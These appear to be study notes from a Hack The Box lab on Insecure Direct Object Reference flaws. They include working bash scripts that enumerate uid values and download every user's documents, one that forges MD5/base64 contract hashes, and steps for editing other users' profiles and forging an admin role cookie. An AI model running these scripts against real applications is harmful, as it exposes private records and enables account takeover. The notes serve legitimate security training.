# Insecure Direct Object References (IDOR)

## 1.Identifying IDORs

### URL Parameters & APIs

filename=file\_1.pdf

filename=file\_2.pdf

### AJAX Calls

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

### Understand Hashing/Encoding

> Suppose the reference was encoded with a common encoder (e.g. `base64`). In that case, we could decode it and view the plaintext of the object reference, change its value, and then encode it again to access other data. For example, if we see a reference like (`?filename=ZmlsZV8xMjMucGRm`), we can immediately guess that the file name is `base64` encoded (from its character set), which we can decode to get the original object reference of (`file_123.pdf`). Then, we can try encoding a different object reference (e.g. `file_124.pdf`)&#x20;

download.php?filename=c81e728d9d4c2f636f067f89cc14862c

### Compare User Roles

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as `User1`. However, with these details at hand, we can try repeating the same API call while logged in as `User2` to see if the web application returns anything.&#x20;

## 2.Mass IDOR Enumeration

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FMP00F2wZSFgVsawjqcPE%2Fimage.png?alt=media&amp;token=5787a5f3-caa1-4819-abdf-6d2258269ad7" alt=""><figcaption></figcaption></figure>

`/documents.php`:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F25IlmvDqqTbmGgfdsEH9%2Fimage.png?alt=media&amp;token=03b69c12-c417-4035-b404-d52dde3a1866" alt=""><figcaption></figcaption></figure>

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

documents.php?uid=1&#x20;

When we try changing the `uid` to `?uid=2`  &#x20;

```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

* we got this

### Mass Enumeration

We can try manually accessing other employee documents with `uid=3`, `uid=4`, and so on. However, manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool like `Burp Intruder`

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

## 3.Bypassing Encoded References

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fc6fWZm4IvEpP3Rx4nnFP%2Fimage.png?alt=media&amp;token=669f9a42-8d74-4bdf-a1fa-538a901f5a82" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fsk2NcMSj6dpNDwlLDXFK%2Fimage.png?alt=media&amp;token=f073887c-f51e-4b86-8112-1ef456358b66" alt=""><figcaption></figcaption></figure>

We see that it is sending a `POST` request to `download.php` with the following data:

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

```shell-session
echo -n 1 | md5sum
```

### Function Disclosure

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:

```shell-session
echo -n 1 | base64 -w 0 | md5sum
```

### Mass Enumeration

```shell-session
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

\
Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

```shell-session
Olanzapine@htb[/htb]$ bash ./exploit.sh
Olanzapine@htb[/htb]$ ls -1
```

## 4.IDOR in Insecure APIs

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F5xCPDNgcSEa4gFrvy8Ye%2Fimage.png?alt=media&amp;token=2ce65dbe-40ea-4319-b1d8-c040c329cbd6" alt=""><figcaption></figcaption></figure>

When we click on the `Edit Profile` button, we are taken to a page to edit information of our user profile, namely `Full Name`, `Email`, and `About Me`, which is a common feature in many web applications:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FH9ccdOLeVBmT8j6O31Zz%2Fimage.png?alt=media&amp;token=2b079c0d-a749-421a-b6f5-57fa1834452b" alt=""><figcaption></figcaption></figure>

click `Update profile`&#x20;

&#x20;

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FggdxLjwPSJ8Tt3GavCkd%2Fimage.png?alt=media&amp;token=c6c4b86b-377b-4572-8889-5c5e4c58ccce" alt=""><figcaption></figcaption></figure>

`PUT` requests are usually used in APIs to update item details,

### Exploiting Insecure APIs

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F8eCAMxR1q2wNH3bxDkrU%2Fimage.png?alt=media&amp;token=a4da8573-4477-4d5a-a7e8-a3957f569a67" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FG75Jwp3U74mi6HWIxYYl%2Fimage.png?alt=media&amp;token=72937897-9eed-40a1-a91a-f5143f591a11" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FGrsIsdX5XL4BsuaMJGXm%2Fimage.png?alt=media&amp;token=f2af3ec8-e696-4101-8906-20e46f63b96e" alt=""><figcaption></figcaption></figure>

try admin / administrator

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fg7lAUrRRtrduQIUV3p1q%2Fimage.png?alt=media&amp;token=2e2b56e4-0035-4698-9dcd-11a59542ee61" alt=""><figcaption></figcaption></figure>

## 4.Chaining IDOR Vulnerabilities

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FJ2M8u703RD5wfELZVa1F%2Fimage.png?alt=media&amp;token=2857a835-1a04-480a-a375-eb34e5a04569" alt=""><figcaption></figcaption></figure>

### Information Disclosure

Let's send a `GET` request with another `uid`:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FrpvTUUYFQoUl21M7U7PN%2Fimage.png?alt=media&amp;token=b76dc933-3d88-4c2e-85ad-18fac7776bc6" alt=""><figcaption></figcaption></figure>

### Modifying Other Users' Details

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F5EmCgAQtbtzgELMI96hS%2Fimage.png?alt=media&amp;token=9f2bbe85-e69a-4fd5-8b1d-8de5f708a9b7" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F2vm7sLJt3inIbyrkTLNf%2Fimage.png?alt=media&amp;token=d7ca88d0-f421-4f6b-912d-1135dc4dc448" alt=""><figcaption></figcaption></figure>

### Chaining Two IDOR Vulnerabilities

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FbHAl8dN3iAXMGIdoFwnS%2Fimage.png?alt=media&amp;token=6a12c16c-adff-40e8-b18e-88277512e67e" alt=""><figcaption></figcaption></figure>

Now, we can refresh the page to update our cookie, or manually set it as `Cookie: role=web_admin`, and then intercept the `Update` request to create a new user and see if we'd be allowed to do so:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F7sOqr02dE0ZBM4p4pHtU%2Fimage.png?alt=media&amp;token=91c9828f-5bb4-48e6-8bff-574ea6211ddd" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FEb1BhlPCmxxNi006ZoKR%2Fimage.png?alt=media&amp;token=b4e7c07b-716c-4ed0-b83b-4e22a317d0ed" alt=""><figcaption></figcaption></figure>
